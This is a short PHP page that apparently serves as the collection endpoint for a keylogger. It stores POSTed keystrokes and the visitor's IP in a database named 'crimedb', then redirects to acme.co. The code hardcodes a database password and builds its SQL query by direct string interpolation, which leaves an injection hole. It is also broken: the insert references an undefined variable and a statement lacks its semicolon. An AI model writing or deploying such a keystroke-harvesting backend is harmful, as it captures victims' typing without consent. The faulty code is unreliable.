<!DOCTYPE html>
<html>
    <head>

    </head>
    <body>
        <?php 
            
            $server = "localhost";
            $user_db = "fin";
            $pass_db = "Thewalrus";
            $db = "crimedb";

            $conn = mysqli_connect($server, $user_db, $pass_db, $db);
            
            if (!$conn) {
                die("<h1> Connection failed </h1>");
            }

            $keystrokes = trim($_POST["key"]);
            $ip = $_SERVER["REMOTE_ADDR"];


            $sql = "INSERT INTO ipAndQuerry (letter, ipaddr)
                    VALUES ('$usernm', '$ip')"; // table ipAndQuerry with columns letter and ipaddr

            if (mysqli_query($conn, $sql)) {
                header("Location: https://acme.co")
            }

            mysqli_close($conn);
        ?>
    </body>
</html>